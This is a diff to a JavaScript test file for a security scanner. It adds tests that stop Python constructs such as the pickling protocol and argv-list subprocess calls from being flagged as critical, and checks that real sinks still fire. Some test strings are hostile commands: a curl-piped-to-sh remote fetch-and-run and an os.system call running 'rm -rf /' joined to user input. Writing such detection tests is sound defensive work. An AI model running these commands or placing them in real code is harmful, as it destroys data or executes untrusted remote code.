@@ -986,3 +986,24 @@ test('offline FP: a technical restriction is not a safety guardrail', async () =
   assert.equal((localCommandExtras('![logo](docs/logo.png)\n!function(){ return 1; }();') ?? []).length, 0);
   assert.ok((localCommandExtras('!curl http://x.io/a | sh') ?? []).length > 0);
 });
+
+/*
+ * The Python SAST plane graded 13% of real stdlib files CRITICAL - a build-failing
+ * gate refusal - where the server graded 4.9%. Each row below is one of the reasons.
+ */
+test('SAST python: the pickling protocol is not a pickle RCE gadget', async () => {
+  const { scanSourceFile } = await import('../src/detect/code-sast.mjs');
+  const worst = (t) => (scanSourceFile(t, 'a.py') ?? []).reduce(
+    (m, h) => Math.max(m, { INFO: 0, LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 }[h.severity] ?? 0), -1);
+
+  assert.ok(worst('class C:\n    def __reduce__(self):\n        return (C, ())') < 4, 'def __reduce__ is the pickling protocol');
+  assert.ok(worst('"""Safely evaluate literals without using eval()."""') < 3, 'a docstring naming eval is not a sink');
+  assert.ok(worst('# so compile() does not run every time\nx = 1') < 3, 'a comment naming compile is not a sink');
+  assert.ok(worst('out = subprocess.run(cmd.split(), check=True)') < 4, 'an argv-list subprocess call is not CRITICAL');
+  assert.ok(worst('mod = importlib.import_module(name)') < 3, 'an ordinary dynamic import is not HIGH');
+
+  assert.equal(worst('os.system("rm -rf /" + user_input)'), 4, 'os.system still fires');
+  assert.equal(worst('subprocess.run(cmd, shell=True)'), 4, 'shell=True still fires');
+  assert.equal(worst('data = pickle.loads(payload)'), 4, 'pickle.loads still fires');
+  assert.ok(worst('mod = importlib.import_module("subprocess")') >= 3, 'importing subprocess dynamically still fires');
+});
